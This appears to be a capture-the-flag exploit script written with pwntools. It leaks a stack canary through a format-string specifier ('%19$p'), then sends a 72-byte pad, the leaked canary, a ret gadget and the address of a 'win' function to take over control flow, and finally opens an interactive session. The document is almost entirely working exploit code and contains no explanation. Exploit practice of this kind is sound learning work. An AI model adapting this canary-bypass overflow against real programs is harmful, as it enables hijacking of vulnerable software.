def main():
    rop = ROP(elf)
    p = conn()

    p.sendline(b"%19$p")
    p.recvline()
    response = p.recvline().strip().decode()
    canary_str = response.split("everything")[0].strip()
    canary = int(canary_str, 16)
    log.success("addr: " + hex(canary))

    canary_offset = b"A"*72
    payload = p64(canary)
    payload += p64(rop.ret.address)
    payload += p64(elf.symbols.win)
    p.sendline(canary_offset+payload)

    p.interactive()

if __name__ == "__main__":
    main()
